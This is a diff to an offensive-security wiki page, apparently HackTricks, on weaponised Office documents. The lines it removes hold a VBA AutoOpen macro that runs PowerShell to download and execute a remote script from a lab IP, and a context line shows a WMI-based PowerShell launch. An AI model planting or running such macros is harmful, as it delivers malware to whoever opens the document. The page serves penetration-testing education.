@@ -68,17 +68,6 @@ Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
 
-#### Remote PowerShell stager via AutoOpen
-
-Minimal `AutoOpen` macro to download and run a remote PowerShell script instead of embedding a `-enc` payload:
-
-```vb
-Sub AutoOpen()
-    Shell "powershell -ep bypass -c ""iex(iwr http://10.10.14.158/shell.ps1 -usebasicparsing)"""
-End Sub
-```
-
-`-usebasicparsing` keeps `Invoke-WebRequest` working on hosts without the IE COM components.
 #### Manually remove metadata
 
 Fo to **File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and Personal Information**.
@@ -310,6 +299,5 @@ Check the page about **places to steal NTLM creds**:
 - [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
 - [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
 - [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
-- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
 
 {{#include ../../banners/hacktricks-training.md}}
